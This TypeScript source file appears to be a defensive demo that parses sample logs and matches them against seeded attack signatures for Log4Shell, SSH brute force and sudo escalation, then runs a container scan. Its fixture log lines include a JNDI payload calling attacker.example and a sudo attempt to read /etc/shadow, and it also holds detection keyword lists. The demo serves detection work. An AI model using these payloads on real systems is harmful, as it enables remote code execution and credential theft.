/**
 * End-to-end security smoke demo (proof of value) for ai-agent-os.
 *
 * Scenario walks through four stages that touch four different subsystems
 * integrated across PRs #2, #4, #5, #6, and #9:
 *
 *   1. Long-term memory: seed three real attack signatures into a vector
 *      store (Chroma v2 by default) so the agent can recognise them later.
 *   2. Short-term memory: parse a sample security log and extract structured
 *      events (the restored tree does not ship a real Elastic/Wazuh endpoint
 *      for this demo, so we parse syslog-style lines locally).
 *   3. Contextual awareness: embed each suspicious event and run a vector
 *      search against the seeded signatures to identify the attack pattern.
 *   4. Action: run the container scanner (Grype) against a public image to
 *      surface CVE-level findings that corroborate the detected pattern.
 *
 * Each stage appends to an in-memory report which is written to
 * `cybersecurity-demo-report.md`. The orchestrator has no hard dependency on
 * Chroma or Grype — missing components are recorded as warnings in the report
 * so the run always completes and leaves a concrete artefact behind.
 */

import { mkdir, writeFile } from 'node:fs/promises';
import { dirname, resolve } from 'node:path';
import {
  ChromaStore,
  type ChromaStoreOptions,
} from '../vector-stores/chroma-store.js';
import type {
  VectorMatch,
  VectorPoint,
  VectorStore,
} from '../vector-stores/vector-store.js';
import {
  ContainerScanTool,
} from '../security/container/container-scan-tool.js';
import type { ToolContext, ToolResult } from '../tools/registry.js';

export interface AttackSignature {
  readonly id: string;
  readonly name: string;
  readonly technique: string;
  readonly description: string;
  readonly keywords: readonly string[];
}

export interface ParsedLogEvent {
  readonly lineNumber: number;
  readonly timestamp: string;
  readonly host: string;
  readonly process: string;
  readonly message: string;
  readonly severity: 'info' | 'warning' | 'critical';
}

export interface CorrelatedFinding {
  readonly event: ParsedLogEvent;
  readonly match: VectorMatch | null;
  readonly signature: AttackSignature | null;
  readonly score: number;
}

export interface SecurityDemoOptions {
  readonly store?: VectorStore;
  readonly containerScan?: (
    input: { engine: 'grype' | 'trivy'; target: string },
    ctx: ToolContext,
  ) => Promise<ToolResult>;
  readonly image?: string;
  readonly logLines?: readonly string[];
  readonly reportPath?: string;
  readonly collection?: string;
  readonly chroma?: ChromaStoreOptions;
  readonly now?: () => Date;
  readonly workspace?: string;
}

export interface SecurityDemoResult {
  readonly ok: boolean;
  readonly reportPath: string;
  readonly reportMarkdown: string;
  readonly stages: ReadonlyArray<{
    readonly name: string;
    readonly ok: boolean;
    readonly detail: string;
  }>;
  readonly findings: readonly CorrelatedFinding[];
}

export const DEFAULT_SIGNATURES: readonly AttackSignature[] = [
  {
    id: 'sig-log4shell',
    name: 'Log4Shell',
    technique: 'CVE-2021-44228 — JNDI lookup injection (T1190)',
    description:
      'Remote code execution against log4j 2.x via crafted ${jndi:ldap://…} strings in any logged field.',
    keywords: ['jndi', 'ldap', '${jndi', 'log4j', 'rmi', 'dnslog'],
  },
  {
    id: 'sig-ssh-bruteforce',
    name: 'SSH Brute Force',
    technique: 'T1110 — Credential Access via sshd',
    description:
      'Repeated failed password attempts from the same source against sshd within a short window.',
    keywords: [
      'sshd',
      'failed password',
      'invalid user',
      'authentication failure',
    ],
  },
  {
    id: 'sig-privesc-sudo',
    name: 'Sudo Privilege Escalation',
    technique: 'T1548.003 — Abuse Elevation Control Mechanism: Sudo',
    description:
      'Unauthorised sudo invocation by a user not present in sudoers or running a blacklisted command.',
    keywords: ['sudo', 'not in the sudoers', 'COMMAND=', 'authentication failure'],
  },
];

export const DEFAULT_LOG_LINES: readonly string[] = [
  '2026-04-18T10:01:12Z web-01 nginx: 10.0.0.42 - - [18/Apr/2026:10:01:12 +0000] "GET /api/search?q=${jndi:ldap://attacker.example/Exploit} HTTP/1.1" 200',
  '2026-04-18T10:01:15Z web-01 nginx: 10.0.0.42 - - [18/Apr/2026:10:01:15 +0000] "GET / HTTP/1.1" 200',
  '2026-04-18T10:02:03Z bastion sshd[4421]: Failed password for invalid user root from 203.0.113.7 port 51022 ssh2',
  '2026-04-18T10:02:05Z bastion sshd[4421]: Failed password for invalid user root from 203.0.113.7 port 51022 ssh2',
  '2026-04-18T10:02:07Z bastion sshd[4421]: Failed password for invalid user admin from 203.0.113.7 port 51022 ssh2',
  '2026-04-18T10:04:31Z app-02 sudo: alice : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow',
  '2026-04-18T10:05:12Z app-02 cron: (root) CMD (/usr/local/bin/cleanup.sh)',
];

const CRITICAL_HINTS = [
  '${jndi',
  'jndi:ldap',
  'invalid user',
  'failed password',
  'not in sudoers',
  'NOT in sudoers',
];
const WARNING_HINTS = ['sudo', 'unauthorized', 'authentication failure'];

const SYSLOG_RE =
  /^(?<ts>\S+)\s+(?<host>\S+)\s+(?<proc>[^:]+):\s+(?<msg>.*)$/;

/**
 * Deterministic keyword-feature embedding.
 *
 * Production deployments should swap this for a real embedding model; for
 * the demo we only need consistent feature vectors that Chroma can do a
 * meaningful cosine search over without pulling in a heavyweight SDK. Each
 * attack signature keyword is assigned a fixed dimension index and the
 * event vector turns on that dimension iff the keyword appears as a
 * substring of the log message. This gives clean, explainable matches and
 * aligns with how rule-based detections typically correlate log events.
 */
export interface SignatureVocabulary {
  readonly dim: number;
  readonly keywordIndex: ReadonlyMap<string, number>;
}

export function buildVocabulary(
  signatures: readonly AttackSignature[],
): SignatureVocabulary {
  const keywordIndex = new Map<string, number>();
  for (const sig of signatures) {
    for (const kw of sig.keywords) {
      const key = kw.toLowerCase();
      if (!keywordIndex.has(key)) keywordIndex.set(key, keywordIndex.size);
    }
  }
  return { dim: Math.max(keywordIndex.size, 1), keywordIndex };
}

function normalise(vec: number[]): number[] {
  const norm = Math.hypot(...vec);
  if (norm === 0) return vec;
  for (let i = 0; i < vec.length; i++) vec[i] /= norm;
  return vec;
}

export function embedSignature(
  sig: AttackSignature,
  vocab: SignatureVocabulary,
): number[] {
  const vec = new Array<number>(vocab.dim).fill(0);
  for (const kw of sig.keywords) {
    const idx = vocab.keywordIndex.get(kw.toLowerCase());
    if (idx !== undefined) vec[idx] = 1;
  }
  return normalise(vec);
}

export function embedEvent(
  message: string,
  vocab: SignatureVocabulary,
): number[] {
  const vec = new Array<number>(vocab.dim).fill(0);
  const lower = message.toLowerCase();
  for (const [kw, idx] of vocab.keywordIndex) {
    if (lower.includes(kw)) vec[idx] = 1;
  }
  return normalise(vec);
}

export function parseLogLines(lines: readonly string[]): ParsedLogEvent[] {
  const events: ParsedLogEvent[] = [];
  lines.forEach((line, idx) => {
    if (!line.trim()) return;
    const match = SYSLOG_RE.exec(line.trim());
    const record = match?.groups ?? {
      ts: '',
      host: '',
      proc: '',
      msg: line.trim(),
    };
    const lower = record.msg.toLowerCase();
    let severity: ParsedLogEvent['severity'] = 'info';
    if (CRITICAL_HINTS.some((h) => lower.includes(h.toLowerCase()))) {
      severity = 'critical';
    } else if (WARNING_HINTS.some((h) => lower.includes(h.toLowerCase()))) {
      severity = 'warning';
    }
    events.push({
      lineNumber: idx + 1,
      timestamp: record.ts,
      host: record.host,
      process: record.proc,
      message: record.msg,
      severity,
    });
  });
  return events;
}

function signatureToPoint(
  sig: AttackSignature,
  vocab: SignatureVocabulary,
): VectorPoint {
  return {
    id: sig.id,
    vector: embedSignature(sig, vocab),
    payload: {
      name: sig.name,
      technique: sig.technique,
      description: sig.description,
      keywords: sig.keywords.join(','),
    },
  };
}

export class SecurityDemo {
  private readonly signatures: readonly AttackSignature[];
  private readonly logLines: readonly string[];
  private readonly store: VectorStore | null;
  private readonly containerScan: SecurityDemoOptions['containerScan'];
  private readonly image: string;
  private readonly reportPath: string;
  private readonly collection: string;
  private readonly vocab: SignatureVocabulary;
  private readonly now: () => Date;
  private readonly workspace: string;
  private readonly report: string[] = [];
  private readonly stages: Array<{
    name: string;
    ok: boolean;
    detail: string;
  }> = [];

  constructor(options: SecurityDemoOptions = {}) {
    this.signatures = DEFAULT_SIGNATURES;
    this.logLines = options.logLines ?? DEFAULT_LOG_LINES;
    this.store =
      options.store ??
      (process.env.CHROMA_URL || process.env.DOGE_DEMO_CHROMA_URL
        ? new ChromaStore({
            baseUrl:
              process.env.DOGE_DEMO_CHROMA_URL ??
              process.env.CHROMA_URL ??
              undefined,
            ...options.chroma,
          })
        : options.chroma
          ? new ChromaStore(options.chroma)
          : null);
    this.containerScan = options.containerScan;
    this.image = options.image ?? 'alpine:3.14';
    this.reportPath =
      options.reportPath ??
      resolve(process.cwd(), 'cybersecurity-demo-report.md');
    this.collection = options.collection ?? 'doge-demo-signatures';
    this.vocab = buildVocabulary(this.signatures);
    this.now = options.now ?? (() => new Date());
    this.workspace = options.workspace ?? process.cwd();
  }

  async run(): Promise<SecurityDemoResult> {
    this.report.push(
      '# Cybersecurity E2E Smoke Demo Report',
      '',
      `Generated: ${this.now().toISOString()}`,
      '',
      'This report is produced by `npm run demo:security`. It exercises a',
      'four-stage defensive workflow using tools already shipped in',
      '`ai-agent-os`:',
      '',
      '1. Long-term memory via the unified VectorStore interface (Chroma v2).',
      '2. Short-term log parsing of a syslog-style feed.',
      '3. Contextual correlation between live events and seeded attack',
      '   signatures using cosine similarity.',
      '4. Container vulnerability scanning with Grype (PR #4).',
      '',
    );

    await this.stageSeedMemory();
    const events = this.stageParseLogs();
    const findings = await this.stageCorrelate(events);
    await this.stageContainerScan(findings);

    this.report.push('## Stage Summary', '');
    for (const s of this.stages) {
      this.report.push(`- ${s.ok ? 'PASS' : 'WARN'} — **${s.name}**: ${s.detail}`);
    }
    this.report.push('');

    const markdown = this.report.join('\n');
    await this.ensureDir(this.reportPath);
    await writeFile(this.reportPath, markdown, 'utf8');

    return {
      ok: this.stages.every((s) => s.ok),
      reportPath: this.reportPath,
      reportMarkdown: markdown,
      stages: this.stages,
      findings,
    };
  }

  private async stageSeedMemory(): Promise<void> {
    this.report.push('## Stage 1 — Seed attack signatures into long-term memory');
    this.report.push('');
    if (!this.store) {
      const detail =
        'No vector store configured (set CHROMA_URL or pass `store`). ' +
        'Skipped seeding; subsequent correlation falls back to in-memory cosine.';
      this.stages.push({ name: 'seed-memory', ok: false, detail });
      this.report.push(`> ${detail}`, '');
      return;
    }
    const ensure = await this.store.ensureCollection(
      this.collection,
      this.vocab.dim,
    );
    if (!ensure.ok) {
      const detail = `ensureCollection failed: ${ensure.error}`;
      this.stages.push({ name: 'seed-memory', ok: false, detail });
      this.report.push(`> ${detail}`, '');
      return;
    }
    const points = this.signatures.map((sig) =>
      signatureToPoint(sig, this.vocab),
    );
    const upsert = await this.store.upsert(this.collection, points);
    if (!upsert.ok) {
      const detail = `upsert failed: ${upsert.error}`;
      this.stages.push({ name: 'seed-memory', ok: false, detail });
      this.report.push(`> ${detail}`, '');
      return;
    }
    this.report.push(
      `Backend: \`${this.store.backend}\` | Collection: \`${this.collection}\` | Dim: ${this.vocab.dim}`,
      '',
      '| ID | Name | Technique |',
      '|----|------|-----------|',
      ...this.signatures.map(
        (s) => `| \`${s.id}\` | ${s.name} | ${s.technique} |`,
      ),
      '',
    );
    this.stages.push({
      name: 'seed-memory',
      ok: true,
      detail: `Seeded ${this.signatures.length} signatures into ${this.store.backend}:${this.collection}.`,
    });
  }

  private stageParseLogs(): ParsedLogEvent[] {
    this.report.push('## Stage 2 — Parse short-term log feed');
    this.report.push('');
    const events = parseLogLines(this.logLines);
    const suspicious = events.filter((e) => e.severity !== 'info');
    this.report.push(
      `Ingested ${events.length} line(s). Flagged ${suspicious.length} as suspicious.`,
      '',
      '| Line | Severity | Host | Process | Message |',
      '|------|----------|------|---------|---------|',
      ...events.map(
        (e) =>
          `| ${e.lineNumber} | ${e.severity} | \`${e.host}\` | \`${e.process}\` | \`${e.message.replace(/\|/g, '\\|').slice(0, 140)}\` |`,
      ),
      '',
    );
    this.stages.push({
      name: 'parse-logs',
      ok: events.length > 0,
      detail: `${events.length} events parsed, ${suspicious.length} flagged for correlation.`,
    });
    return events;
  }

  private async stageCorrelate(
    events: readonly ParsedLogEvent[],
  ): Promise<CorrelatedFinding[]> {
    this.report.push('## Stage 3 — Correlate live events with long-term memory');
    this.report.push('');
    const suspicious = events.filter((e) => e.severity !== 'info');
    const findings: CorrelatedFinding[] = [];
    const seedVectors = new Map<string, number[]>();
    for (const sig of this.signatures) {
      seedVectors.set(sig.id, embedSignature(sig, this.vocab));
    }

    for (const event of suspicious) {
      const vector = embedEvent(event.message, this.vocab);
      let match: VectorMatch | null = null;
      if (this.store && vector.some((v) => v !== 0)) {
        const res = await this.store.search(this.collection, {
          vector,
          limit: 1,
        });
        if (res.ok && res.matches[0] && res.matches[0].score > 0) {
          match = res.matches[0];
        }
      }
      if (!match) {
        // In-memory fallback: dot product against seeded signatures so the
        // demo still produces meaningful correlations when Chroma is down
        // or did not return a match above the similarity floor.
        let bestId = '';
        let bestScore = 0;
        for (const [id, sigVec] of seedVectors) {
          let score = 0;
          for (let i = 0; i < this.vocab.dim; i++) {
            score += vector[i] * sigVec[i];
          }
          if (score > bestScore) {
            bestScore = score;
            bestId = id;
          }
        }
        if (bestId) {
          match = { id: bestId, score: bestScore };
        }
      }
      const matchedId = match ? String(match.id) : null;
      const signature =
        (matchedId
          ? this.signatures.find((s) => s.id === matchedId)
          : null) ?? null;
      findings.push({
        event,
        match,
        signature,
        score: match?.score ?? 0,
      });
    }

    if (findings.length === 0) {
      this.report.push('_No suspicious events to correlate._', '');
    } else {
      this.report.push(
        '| Line | Event | Matched Signature | Score |',
        '|------|-------|-------------------|-------|',
        ...findings.map((f) => {
          const sig = f.signature
            ? `${f.signature.name} (${f.signature.id})`
            : '_none_';
          return `| ${f.event.lineNumber} | \`${f.event.message.slice(0, 100).replace(/\|/g, '\\|')}\` | ${sig} | ${f.score.toFixed(3)} |`;
        }),
        '',
      );
    }

    const recognised = findings.filter((f) => f.signature).length;
    this.stages.push({
      name: 'correlate',
      ok: recognised > 0,
      detail: `Recognised ${recognised} of ${findings.length} suspicious events as known patterns.`,
    });
    return findings;
  }

  private async stageContainerScan(
    findings: readonly CorrelatedFinding[],
  ): Promise<void> {
    this.report.push('## Stage 4 — Container vulnerability scan');
    this.report.push('');
    const triggers = findings.filter(
      (f) => f.signature?.id === 'sig-log4shell',
    );
    this.report.push(
      triggers.length > 0
        ? `Log4Shell correlation detected — pivoting to container scan of \`${this.image}\` to find vulnerable dependencies.`
        : `No Log4Shell correlation found, running baseline scan of \`${this.image}\` anyway to exercise the tool.`,
      '',
    );
    const runner =
      this.containerScan ??
      ((input: { engine: 'grype' | 'trivy'; target: string }, ctx: ToolContext) =>
        new ContainerScanTool().run(
          { engine: input.engine, target: input.target, maxFindings: 10 },
          ctx,
        ));
    const ctx: ToolContext = { workspace: this.workspace };
    const result = await runner(
      { engine: 'grype', target: this.image },
      ctx,
    );
    if (!result.ok) {
      const detail = `container_scan failed: ${result.error ?? 'unknown error'}`;
      this.report.push(`> ${detail}`, '');
      this.stages.push({ name: 'container-scan', ok: false, detail });
      return;
    }
    const lines = result.output.split('\n');
    this.report.push('```', ...lines.slice(0, 15), '```', '');
    this.stages.push({
      name: 'container-scan',
      ok: true,
      detail: `Scanned ${this.image}; summary line: ${lines[0] ?? '(empty)'}`,
    });
  }

  private async ensureDir(path: string): Promise<void> {
    const dir = dirname(path);
    await mkdir(dir, { recursive: true }).catch(() => undefined);
  }
}
